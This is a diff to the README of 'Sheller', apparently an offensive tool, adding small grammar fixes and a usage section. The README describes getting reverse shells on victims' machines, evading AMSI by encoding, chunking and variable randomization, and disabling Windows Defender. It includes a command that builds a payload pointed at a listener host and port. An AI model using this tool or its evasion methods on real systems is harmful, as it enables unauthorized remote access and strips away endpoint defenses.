@@ -4,9 +4,15 @@ Sheller is a Windows Post Exploitation Tool to bypass all known Anti-Malware Sca
 
 ![](https://user-images.githubusercontent.com/73026669/150165109-71b9f841-3b8e-42bd-a502-5d666244eaaf.png)
 
-For use python3 and powershell (Windows) or pwsh (Linux) is required, the script supports Windows and Linux application.
-The module sheller is to gain reverse shell to the victims device, providing several amsi bypass module such as encoding chunking and var randomization.
+For use python3 and powershell (Windows) or pwsh (Linux) are required, the script supports Windows and Linux application.
+The module sheller is to gain reverse shell to the victims device, providing several amsi bypass module such as encoding, chunking and var randomization.
 There is a module to disable any windows defender antivirus feature if executed with admin privileges too.
+
+To see Information:
+```python 
+python3 sheller.py
+```
+
 ``
 python sheller.py -s xy.bat -lh lh -lp 12 -b64: 
 ``
